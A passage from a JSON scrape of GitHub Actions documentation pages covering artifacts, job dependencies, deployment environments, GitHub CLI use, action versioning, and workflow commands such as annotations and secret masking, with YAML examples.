        "content": "- name: Download a single artifact\n  uses: actions/download-artifact@v4\n  with:\n    name: my-artifact"
      },
      {
        "type": "paragraph",
        "text": "You can also download all artifacts in a workflow run by not specifying a name. This can be useful if you are working with lots of artifacts."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "- name: Download all workflow run artifacts\n  uses: actions/download-artifact@v4"
      },
      {
        "type": "paragraph",
        "text": "If you download all workflow run's artifacts, a directory for each artifact is created using its name."
      },
      {
        "type": "paragraph",
        "text": "For more information on syntax, see theactions/download-artifactaction."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Validating artifacts"
      },
      {
        "type": "paragraph",
        "text": "Every time the upload-artifact action is used it returns an output calleddigest. This is a SHA256 digest of the Artifact you uploaded during a workflow run."
      },
      {
        "type": "paragraph",
        "text": "When the download-artifact action is then used to download that artifact, it automatically calculates the digest for that downloaded artifact and validates that it matches the output from the upload-artifact step."
      },
      {
        "type": "paragraph",
        "text": "If the digest does not match, the run will display a warning in the UI and in the job logs."
      },
      {
        "type": "paragraph",
        "text": "To view the SHA256 digest you can open the logs for the upload-artifact job or check in the Artifact output that appears in the workflow run UI."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Passing data between jobs in a workflow"
      },
      {
        "type": "paragraph",
        "text": "You can use theupload-artifactanddownload-artifactactions to share data between jobs in a workflow. This example workflow illustrates how to pass data between jobs in the same workflow. For more information, see theactions/upload-artifactanddownload-artifactactions."
      },
      {
        "type": "paragraph",
        "text": "Jobs that are dependent on a previous job's artifacts must wait for the dependent job to complete successfully. This workflow uses theneedskeyword to ensure thatjob_1,job_2, andjob_3run sequentially. For example,job_2requiresjob_1using theneeds: job_1syntax."
      },
      {
        "type": "paragraph",
        "text": "Job 1 performs these steps:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "Performs a math calculation and saves the result to a text file calledmath-homework.txt.",
          "Uses theupload-artifactaction to upload themath-homework.txtfile with the artifact namehomework_pre."
        ]
      },
      {
        "type": "paragraph",
        "text": "Job 2 uses the result in the previous job:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "Downloads thehomework_preartifact uploaded in the previous job. By default, thedownload-artifactaction downloads artifacts to the workspace directory that the step is executing in. You can use thepathinput parameter to specify a different download directory.",
          "Reads the value in themath-homework.txtfile, performs a math calculation, and saves the result tomath-homework.txtagain, overwriting its contents.",
          "Uploads themath-homework.txtfile. As artifacts are considered immutable inv4, the artifact is passed a different input,homework_final, as a name."
        ]
      },
      {
        "type": "paragraph",
        "text": "Job 3 displays the result uploaded in the previous job:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "Downloads thehomework_finalartifact from Job 2.",
          "Prints the result of the math equation to the log."
        ]
      },
      {
        "type": "paragraph",
        "text": "The full math operation performed in this workflow example is(3 + 7) x 9 = 90."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "name: Share data between jobs\n\non: [push]\n\njobs:\n  job_1:\n    name: Add 3 and 7\n    runs-on: ubuntu-latest\n    steps:\n      - shell: bash\n        run: |\n          expr 3 + 7 > math-homework.txt\n      - name: Upload math result for job 1\n        uses: actions/upload-artifact@v4\n        with:\n          name: homework_pre\n          path: math-homework.txt\n\n  job_2:\n    name: Multiply by 9\n    needs: job_1\n    runs-on: windows-latest\n    steps:\n      - name: Download math result for job 1\n        uses: actions/download-artifact@v4\n        with:\n          name: homework_pre\n      - shell: bash\n        run: |\n          value=`cat math-homework.txt`\n          expr $value \\* 9 > math-homework.txt\n      - name: Upload math result for job 2\n        uses: actions/upload-artifact@v4\n        with:\n          name: homework_final\n          path: math-homework.txt\n\n  job_3:\n    name: Display results\n    needs: job_2\n    runs-on: macOS-latest\n    steps:\n      - name: Download math result for job 2\n        uses: actions/download-artifact@v4\n        with:\n          name: homework_final\n      - name: Print the final result\n        shell: bash\n        run: |\n          value=`cat math-homework.txt`\n          echo The result is $value"
      },
      {
        "type": "paragraph",
        "text": "The workflow run will archive any artifacts that it generated. For more information on downloading archived artifacts, seeDownloading workflow artifacts."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Artifacts from deleted workflow runs"
      },
      {
        "type": "paragraph",
        "text": "When a workflow run is deleted all artifacts associated with the run are also deleted from storage. You can delete a workflow run using the GitHub Actions UI, the REST API, or using the GitHub CLI, see:Deleting a workflow run,Delete a workflow run, orgh run delete."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Further reading"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "Managing billing for GitHub Actions."
        ]
      }
    ]
  },
  {
    "url": "https://docs.github.com/en/actions/writing-workflows/choosing-what-your-workflow-does/using-environments-for-deployment",
    "content": [
      {
        "type": "heading",
        "level": 2,
        "text": "About environments"
      },
      {
        "type": "paragraph",
        "text": "Environments are used to describe a general deployment target likeproduction,staging, ordevelopment. When a GitHub Actions workflow deploys to an environment, the environment is displayed on the main page of the repository. You can use environments to require approval for a job to proceed, restrict which branches can trigger a workflow, gate deployments with custom deployment protection rules, or limit access to secrets. For more information about creating environments, seeManaging environments for deployment."
      },
      {
        "type": "paragraph",
        "text": "Each job in a workflow can reference a single environment. Any protection rules configured for the environment must pass before a job referencing the environment is sent to a runner. The job can access the environment's secrets only after the job is sent to a runner."
      },
      {
        "type": "paragraph",
        "text": "When a workflow references an environment, the environment will appear in the repository's deployments. For more information about viewing current and previous deployments, seeViewing deployment history."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Using an environment in a workflow"
      },
      {
        "type": "paragraph",
        "text": "You can specify an environment for each job in your workflow. To do so, add ajobs.<job_id>.environmentkey followed by the name of the environment."
      },
      {
        "type": "paragraph",
        "text": "For example, this workflow will use an environment calledproduction."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "name: Deployment\n\non:\n  push:\n    branches:\n      - main\n\njobs:\n  deployment:\n    runs-on: ubuntu-latest\n    environment: production\n    steps:\n      - name: deploy\n        # ...deployment-specific steps"
      },
      {
        "type": "paragraph",
        "text": "When the above workflow runs, thedeploymentjob will be subject to any rules configured for theproductionenvironment. For example, if the environment requires reviewers, the job will pause until one of the reviewers approves the job."
      },
      {
        "type": "paragraph",
        "text": "You can also specify a URL for the environment. The specified URL will appear on the deployments page for the repository (accessed by clickingEnvironmentson the home page of your repository) and in the visualization graph for the workflow run. If a pull request triggered the workflow, the URL is also displayed as aView deploymentbutton in the pull request timeline. When using the \"Require deployments to succeed before merging\" rule, only thenamespecified is being checked even if a URL has also been specified. SeeAbout protected branches."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "name: Deployment\n\non:\n  push:\n    branches:\n      - main\n\njobs:\n  deployment:\n    runs-on: ubuntu-latest\n    environment: \n      name: production\n      url: https://github.com\n    steps:\n      - name: deploy\n        # ...deployment-specific steps"
      }
    ]
  },
  {
    "url": "https://docs.github.com/en/actions/writing-workflows/choosing-what-your-workflow-does/using-github-cli-in-workflows",
    "content": [
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "To learn more about GitHub CLI, seeAbout GitHub CLI."
      },
      {
        "type": "paragraph",
        "text": "GitHub CLI is preinstalled on all GitHub-hosted runners. For each step that uses GitHub CLI, you must set an environment variable calledGH_TOKENto a token with the required scopes."
      },
      {
        "type": "paragraph",
        "text": "You can execute any GitHub CLI command. For example, this workflow uses thegh issue commentsubcommand to add a comment when an issue is opened."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "name: Comment when opened\non:\n  issues:\n    types:\n      - opened\njobs:\n  comment:\n    runs-on: ubuntu-latest\n    steps:\n      - run: gh issue comment $ISSUE --body \"Thank you for opening this issue!\"\n        env:\n          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}\n          ISSUE: ${{ github.event.issue.html_url }}"
      },
      {
        "type": "paragraph",
        "text": "You can also execute API calls through GitHub CLI. For example, this workflow first uses thegh apisubcommand to query the GraphQL API and parse the result. Then it stores the result in an environment variable that it can access in a later step. In the second step, it uses thegh issue createsubcommand to create an issue containing the information from the first step."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "name: Report remaining open issues\non: \n  schedule: \n    # Daily at 8:20 UTC\n    - cron: '20 8 * * *'\njobs:\n  track_pr:\n    runs-on: ubuntu-latest\n    steps:\n      - run: |\n          numOpenIssues=\"$(gh api graphql -F owner=$OWNER -F name=$REPO -f query='\n            query($name: String!, $owner: String!) {\n              repository(owner: $owner, name: $name) {\n                issues(states:OPEN){\n                  totalCount\n                }\n              }\n            }\n          ' --jq '.data.repository.issues.totalCount')\"\n\n          echo 'NUM_OPEN_ISSUES='$numOpenIssues >> $GITHUB_ENV\n        env:\n          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}\n          OWNER: ${{ github.repository_owner }}\n          REPO: ${{ github.event.repository.name }}\n      - run: |\n          gh issue create --title \"Issue report\" --body \"$NUM_OPEN_ISSUES issues remaining\" --repo $GITHUB_REPOSITORY\n        env:\n          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}"
      }
    ]
  },
  {
    "url": "https://docs.github.com/en/actions/writing-workflows/choosing-what-your-workflow-does/using-jobs-in-a-workflow",
    "content": [
      {
        "type": "heading",
        "level": 2,
        "text": "Overview"
      },
      {
        "type": "paragraph",
        "text": "A workflow run is made up of one or morejobs, which run in parallel by default. To run jobs sequentially, you can define dependencies on other jobs using thejobs.<job_id>.needskeyword."
      },
      {
        "type": "paragraph",
        "text": "Each job runs in a runner environment specified byruns-on."
      },
      {
        "type": "paragraph",
        "text": "You can run an unlimited number of jobs as long as you are within the workflow usage limits. For more information, seeUsage limits, billing, and administrationfor GitHub-hosted runners andUsage limits for self-hosted runnersfor self-hosted runner usage limits."
      },
      {
        "type": "paragraph",
        "text": "If you need to find the unique identifier of a job running in a workflow run, you can use the GitHub API. For more information, seeREST API endpoints for GitHub Actions."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Setting an ID for a job"
      },
      {
        "type": "paragraph",
        "text": "Usejobs.<job_id>to give your job a unique identifier. The keyjob_idis a string and its value is a map of the job's configuration data. You must replace<job_id>with a string that is unique to thejobsobject. The<job_id>must start with a letter or_and contain only alphanumeric characters,-, or_."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Example: Creating jobs"
      },
      {
        "type": "paragraph",
        "text": "In this example, two jobs have been created, and theirjob_idvalues aremy_first_jobandmy_second_job."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "jobs:\n  my_first_job:\n    name: My first job\n  my_second_job:\n    name: My second job"
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Setting a name for a job"
      },
      {
        "type": "paragraph",
        "text": "Usejobs.<job_id>.nameto set a name for the job, which is displayed in the GitHub UI."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Defining prerequisite jobs"
      },
      {
        "type": "paragraph",
        "text": "Usejobs.<job_id>.needsto identify any jobs that must complete successfully before this job will run. It can be a string or array of strings. If a job fails or is skipped, all jobs that need it are skipped unless the jobs use a conditional expression that causes the job to continue. If a run contains a series of jobs that need each other, a failure or skip applies to all jobs in the dependency chain from the point of failure or skip onwards. If you would like a job to run even if a job it is dependent on did not succeed, use thealways()conditional expression injobs.<job_id>.if."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Example: Requiring successful dependent jobs"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "jobs:\n  job1:\n  job2:\n    needs: job1\n  job3:\n    needs: [job1, job2]"
      },
      {
        "type": "paragraph",
        "text": "In this example,job1must complete successfully beforejob2begins, andjob3waits for bothjob1andjob2to complete."
      },
      {
        "type": "paragraph",
        "text": "The jobs in this example run sequentially:"
      },
      {
        "type": "list",
        "ordered": true,
        "items": [
          "job1",
          "job2",
          "job3"
        ]
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Example: Not requiring successful dependent jobs"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "jobs:\n  job1:\n  job2:\n    needs: job1\n  job3:\n    if: ${{ always() }}\n    needs: [job1, job2]"
      },
      {
        "type": "paragraph",
        "text": "In this example,job3uses thealways()conditional expression so that it always runs afterjob1andjob2have completed, regardless of whether they were successful. For more information, seeEvaluate expressions in workflows and actions."
      }
    ]
  },
  {
    "url": "https://docs.github.com/en/actions/writing-workflows/choosing-what-your-workflow-does/using-pre-written-building-blocks-in-your-workflow",
    "content": [
      {
        "type": "heading",
        "level": 2,
        "text": "Overview"
      },
      {
        "type": "paragraph",
        "text": "You can use pre-written building blocks, called actions, in your workflow. An action is a pre-defined, reusable set of jobs or code that perform specific tasks within a workflow."
      },
      {
        "type": "paragraph",
        "text": "Actions can be:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "Reusable:actions can be used across different workflows and repositories, allowing you to avoid rewriting the same code.",
          "Pre-written:many actions are available in the GitHub Marketplace, covering a wide range of tasks like checking out code, setting up environments, running tests, and deploying applications.",
          "Configurable:you can configure actions with inputs, outputs, and environment variables to tailor them to your specific needs.",
          "Community-driven:you can create your own actions and share them with others or use actions developed by the community."
        ]
      },
      {
        "type": "paragraph",
        "text": "The actions you use in your workflow can be defined in:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "The same repository as your workflow file",
          "Any public repository",
          "A published Docker container image on Docker Hub"
        ]
      },
      {
        "type": "paragraph",
        "text": "GitHub Marketplace is a central location for you to find actions created by the GitHub community.GitHub Marketplace pageenables you to filter for actions by category."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Browsing Marketplace actions in the workflow editor"
      },
      {
        "type": "paragraph",
        "text": "You can search and browse actions directly in your repository's workflow editor. From the sidebar, you can search for a specific action, view featured actions, and browse featured categories. You can also view the number of stars an action has received from the GitHub community."
      },
      {
        "type": "list",
        "ordered": true,
        "items": [
          "In your repository, browse to the workflow file you want to edit.",
          "In the upper right corner of the file view, to open the workflow editor, click.",
          "To the right of the editor, use the GitHub Marketplace sidebar to browse actions. Actions with thebadge indicate GitHub has verified the creator of the action as a partner organization."
        ]
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Adding an action to your workflow"
      },
      {
        "type": "paragraph",
        "text": "You can add an action to your workflow by referencing the action in your workflow file."
      },
      {
        "type": "paragraph",
        "text": "You can view the actions referenced in your GitHub Actions workflows as dependencies in the dependency graph of the repository containing your workflows. For more information, see “About the dependency graph.”"
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "To enhance security, GitHub Actions does not support redirects for actions or reusable workflows. This means that when the owner, name of an action's repository, or name of an action is changed, any workflows using that action with the previous name will fail."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Adding an action from GitHub Marketplace"
      },
      {
        "type": "paragraph",
        "text": "An action's listing page includes the action's version and the workflow syntax required to use the action. To keep your workflow stable even when updates are made to an action, you can reference the version of the action to use by specifying the Git or Docker tag number in your workflow file."
      },
      {
        "type": "list",
        "ordered": true,
        "items": [
          "Navigate to the action you want to use in your workflow.",
          "Click to view the full marketplace listing for the action.",
          "Under \"Installation\", clickto copy the workflow syntax.",
          "Paste the syntax as a new step in your workflow. For more information, seeWorkflow syntax for GitHub Actions.",
          "If the action requires you to provide inputs, set them in your workflow. For information on inputs an action might require, seeUsing pre-written building blocks in your workflow."
        ]
      },
      {
        "type": "paragraph",
        "text": "You can also enable Dependabot version updates for the actions that you add to your workflow. For more information, seeKeeping your actions up to date with Dependabot."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Adding an action from the same repository"
      },
      {
        "type": "paragraph",
        "text": "If an action is defined in the same repository where your workflow file uses the action, you can reference the action with either the ‌{owner}/{repo}@{ref}or./path/to/dirsyntax in your workflow file."
      },
      {
        "type": "paragraph",
        "text": "Example repository file structure:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "|-- hello-world (repository)\n|   |__ .github\n|       └── workflows\n|           └── my-first-workflow.yml\n|       └── actions\n|           |__ hello-world-action\n|               └── action.yml"
      },
      {
        "type": "paragraph",
        "text": "The path is relative (./) to the default working directory (github.workspace,$GITHUB_WORKSPACE). If the action checks out the repository to a location different than the workflow, the relative path used for local actions must be updated."
      },
      {
        "type": "paragraph",
        "text": "Example workflow file:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "jobs:\n  my_first_job:\n    runs-on: ubuntu-latest\n    steps:\n      # This step checks out a copy of your repository.\n      - name: My first step - check out repository\n        uses: actions/checkout@v4\n      # This step references the directory that contains the action.\n      - name: Use local hello-world-action\n        uses: ./.github/actions/hello-world-action"
      },
      {
        "type": "paragraph",
        "text": "Theaction.ymlfile is used to provide metadata for the action. Learn about the content of this file inMetadata syntax for GitHub Actions."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Adding an action from a different repository"
      },
      {
        "type": "paragraph",
        "text": "If an action is defined in a different repository than your workflow file, you can reference the action with the{owner}/{repo}@{ref}syntax in your workflow file."
      },
      {
        "type": "paragraph",
        "text": "The action must be stored in a public repository."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "jobs:\n  my_first_job:\n    steps:\n      - name: My first step\n        uses: actions/setup-node@v4"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Referencing a container on Docker Hub"
      },
      {
        "type": "paragraph",
        "text": "If an action is defined in a published Docker container image on Docker Hub, you must reference the action with thedocker://{image}:{tag}syntax in your workflow file. To protect your code and data, we strongly recommend you verify the integrity of the Docker container image from Docker Hub before using it in your workflow."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "jobs:\n  my_first_job:\n    steps:\n      - name: My first step\n        uses: docker://alpine:3.8"
      },
      {
        "type": "paragraph",
        "text": "For some examples of Docker actions, see theDocker-image.yml workflowandCreating a Docker container action."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Security hardening for using actions in your workflows"
      },
      {
        "type": "paragraph",
        "text": "GitHub provides security features that you can use to increase the security of your workflows. You can use GitHub's built-in features to ensure you are notified about vulnerabilities in the actions you consume, or to automate the process of keeping the actions in your workflows up to date. For more information, seeUsing GitHub's security features to secure your use of GitHub Actions."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Using release management for your custom actions"
      },
      {
        "type": "paragraph",
        "text": "The creators of a community action have the option to use tags, branches, or SHA values to manage releases of the action. Similar to any dependency, you should indicate the version of the action you'd like to use based on your comfort with automatically accepting updates to the action."
      },
      {
        "type": "paragraph",
        "text": "You will designate the version of the action in your workflow file. Check the action's documentation for information on their approach to release management, and to see which tag, branch, or SHA value to use."
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "We recommend that you use a SHA value when using third-party actions. However, it's important to note Dependabot will only create Dependabot alerts for vulnerable GitHub Actions that use semantic versioning. For more information, seeSecurity hardening for GitHub ActionsandAbout Dependabot alerts."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Using tags"
      },
      {
        "type": "paragraph",
        "text": "Tags are useful for letting you decide when to switch between major and minor versions, but these are more ephemeral and can be moved or deleted by the maintainer. This example demonstrates how to target an action that's been tagged asv1.0.1:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "steps:\n  - uses: actions/javascript-action@v1.0.1"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Using SHAs"
      },
      {
        "type": "paragraph",
        "text": "If you need more reliable versioning, you should use the SHA value associated with the version of the action. SHAs are immutable and therefore more reliable than tags or branches. However, this approach means you will not automatically receive updates for an action, including important bug fixes and security updates. You must use a commit's full SHA value, and not an abbreviated value. When selecting a SHA, you should verify it is from the action's repository and not a repository fork. This example targets an action's SHA:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "steps:\n  - uses: actions/javascript-action@a824008085750b8e136effc585c3cd6082bd575f"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Using branches"
      },
      {
        "type": "paragraph",
        "text": "Specifying a target branch for the action means it will always run the version currently on that branch. This approach can create problems if an update to the branch includes breaking changes. This example targets a branch named@main:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "steps:\n  - uses: actions/javascript-action@main"
      },
      {
        "type": "paragraph",
        "text": "For more information, seeAbout custom actions."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Using inputs and outputs with an action"
      },
      {
        "type": "paragraph",
        "text": "An action often accepts or requires inputs and generates outputs that you can use. For example, an action might require you to specify a path to a file, the name of a label, or other data it will use as part of the action processing."
      },
      {
        "type": "paragraph",
        "text": "To see the inputs and outputs of an action, check theaction.ymlin the root directory of the repository."
      },
      {
        "type": "paragraph",
        "text": "In this exampleaction.yml, theinputskeyword defines a required input calledfile-path, and includes a default value that will be used if none is specified. Theoutputskeyword defines an output calledresults-file, which tells you where to locate the results."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "name: \"Example\"\ndescription: \"Receives file and generates output\"\ninputs:\n  file-path: # id of input\n    description: \"Path to test script\"\n    required: true\n    default: \"test-file.js\"\noutputs:\n  results-file: # id of output\n    description: \"Path to results file\""
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Next steps"
      },
      {
        "type": "paragraph",
        "text": "To continue learning about GitHub Actions, seeUnderstanding GitHub Actions."
      }
    ]
  },
  {
    "url": "https://docs.github.com/en/actions/writing-workflows/choosing-what-your-workflow-does/workflow-commands-for-github-actions",
    "content": [
      {
        "type": "heading",
        "level": 2,
        "text": "About workflow commands"
      },
      {
        "type": "paragraph",
        "text": "Actions can communicate with the runner machine to set environment variables, output values used by other actions, add debug messages to the output logs, and other tasks."
      },
      {
        "type": "paragraph",
        "text": "Most workflow commands use theechocommand in a specific format, while others are invoked by writing to a file. For more information, seeEnvironment files."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Example of a workflow command"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "echo \"::workflow-command parameter1={data},parameter2={data}::{command value}\""
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "Write-Output \"::workflow-command parameter1={data},parameter2={data}::{command value}\""
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "Workflow command and parameter names are case insensitive."
      },
      {
        "type": "paragraph",
        "text": "Warning"
      },
      {
        "type": "paragraph",
        "text": "If you are using Command Prompt, omit double quote characters (\") when using workflow commands."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Using workflow commands to access toolkit functions"
      },
      {
        "type": "paragraph",
        "text": "Theactions/toolkitincludes a number of functions that can be executed as workflow commands. Use the::syntax to run the workflow commands within your YAML file; these commands are then sent to the runner overstdout."
      },
      {
        "type": "paragraph",
        "text": "For example, instead of using code to create an error annotation, as below:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "core.error('Missing semicolon', {file: 'app.js', startLine: 1})"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Example: Creating an annotation for an error"
      },
      {
        "type": "paragraph",
        "text": "You can use theerrorcommand in your workflow to create the same error annotation:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "- name: Create annotation for build error\n        run: echo \"::error file=app.js,line=1::Missing semicolon\""
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "- name: Create annotation for build error\n        run: Write-Output \"::error file=app.js,line=1::Missing semicolon\""
      },
      {
        "type": "paragraph",
        "text": "The following table shows which toolkit functions are available within a workflow:"
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Setting a debug message"
      },
      {
        "type": "paragraph",
        "text": "Prints a debug message to the log. You must create a secret namedACTIONS_STEP_DEBUGwith the valuetrueto see the debug messages set by this command in the log. For more information, seeEnabling debug logging."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "::debug::{message}"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Example: Setting a debug message"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "echo \"::debug::Set the Octocat variable\""
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "Write-Output \"::debug::Set the Octocat variable\""
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Setting a notice message"
      },
      {
        "type": "paragraph",
        "text": "Creates a notice message and prints the message to the log. This message will create an annotation, which can associate the message with a particular file in your repository. Optionally, your message can specify a position within the file."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "::notice file={name},line={line},endLine={endLine},title={title}::{message}"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Example: Setting a notice message"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "echo \"::notice file=app.js,line=1,col=5,endColumn=7::Missing semicolon\""
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "Write-Output \"::notice file=app.js,line=1,col=5,endColumn=7,title=YOUR-TITLE::Missing semicolon\""
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Setting a warning message"
      },
      {
        "type": "paragraph",
        "text": "Creates a warning message and prints the message to the log. This message will create an annotation, which can associate the message with a particular file in your repository. Optionally, your message can specify a position within the file."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "::warning file={name},line={line},endLine={endLine},title={title}::{message}"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Example: Setting a warning message"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "echo \"::warning file=app.js,line=1,col=5,endColumn=7,title=YOUR-TITLE::Missing semicolon\""
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "Write-Output \"::warning file=app.js,line=1,col=5,endColumn=7,title=YOUR-TITLE::Missing semicolon\""
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Setting an error message"
      },
      {
        "type": "paragraph",
        "text": "Creates an error message and prints the message to the log. This message will create an annotation, which can associate the message with a particular file in your repository. Optionally, your message can specify a position within the file."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "::error file={name},line={line},endLine={endLine},title={title}::{message}"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Example: Setting an error message"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "echo \"::error file=app.js,line=1,col=5,endColumn=7,title=YOUR-TITLE::Missing semicolon\""
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "Write-Output \"::error file=app.js,line=1,col=5,endColumn=7,title=YOUR-TITLE::Missing semicolon\""
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Grouping log lines"
      },
      {
        "type": "paragraph",
        "text": "Creates an expandable group in the log. To create a group, use thegroupcommand and specify atitle. Anything you print to the log between thegroupandendgroupcommands is nested inside an expandable entry in the log."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "::group::{title}\n::endgroup::"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Example: Grouping log lines"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "jobs:\n  bash-example:\n    runs-on: ubuntu-latest\n    steps:\n      - name: Group of log lines\n        run: |\n            echo \"::group::My title\"\n            echo \"Inside group\"\n            echo \"::endgroup::\""
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "jobs:\n  powershell-example:\n    runs-on: windows-latest\n    steps:\n      - name: Group of log lines\n        run: |\n            Write-Output \"::group::My title\"\n            Write-Output \"Inside group\"\n            Write-Output \"::endgroup::\""
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Masking a value in a log"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "::add-mask::{value}"
      },
      {
        "type": "paragraph",
        "text": "Masking a value prevents a string or variable from being printed in the log. Each masked word separated by whitespace is replaced with the*character. You can use an environment variable or string for the mask'svalue. When you mask a value, it is treated as a secret and will be redacted on the runner. For example, after you mask a value, you won't be able to set that value as an output."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Example: Masking a string"
      },
      {
        "type": "paragraph",
        "text": "When you print\"Mona The Octocat\"in the log, you'll see\"***\"."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "echo \"::add-mask::Mona The Octocat\""
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "Write-Output \"::add-mask::Mona The Octocat\""
      },
      {
        "type": "paragraph",
        "text": "Warning"
      },
      {
        "type": "paragraph",
        "text": "Make sure you register the secret with 'add-mask' before outputting it in the build logs or using it in any other workflow commands."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Example: Masking an environment variable"
      },
      {
        "type": "paragraph",
        "text": "When you print the variableMY_NAMEor the value\"Mona The Octocat\"in the log, you'll see\"***\"instead of\"Mona The Octocat\"."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "jobs:\n  bash-example:\n    runs-on: ubuntu-latest\n    env:\n      MY_NAME: \"Mona The Octocat\"\n    steps:\n      - name: bash-version\n        run: echo \"::add-mask::$MY_NAME\""
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "jobs:\n  powershell-example:\n    runs-on: windows-latest\n    env:\n      MY_NAME: \"Mona The Octocat\"\n    steps:\n      - name: powershell-version\n        run: Write-Output \"::add-mask::$env:MY_NAME\""
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Example: Masking a generated output within a single job"
      },
      {
        "type": "paragraph",
        "text": "If you do not need to pass your secret from one job to another job, you can:"
      },
      {
        "type": "list",
        "ordered": true,
        "items": [
          "Generate the secret (without outputting it).",
          "Mask it withadd-mask.",
          "UseGITHUB_OUTPUTto make the secret available to other steps within the job."
        ]
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "on: push\njobs:\n  generate-a-secret-output:\n    runs-on: ubuntu-latest\n    steps:\n      - id: sets-a-secret\n        name: Generate, mask, and output a secret\n        run: |\n          the_secret=$((RANDOM))\n          echo \"::add-mask::$the_secret\"\n          echo \"secret-number=$the_secret\" >> \"$GITHUB_OUTPUT\"\n      - name: Use that secret output (protected by a mask)\n        run: |\n          echo \"the secret number is ${{ steps.sets-a-secret.outputs.secret-number }}\""
      },
      {
        "type": "code",
        "language": "yaml",
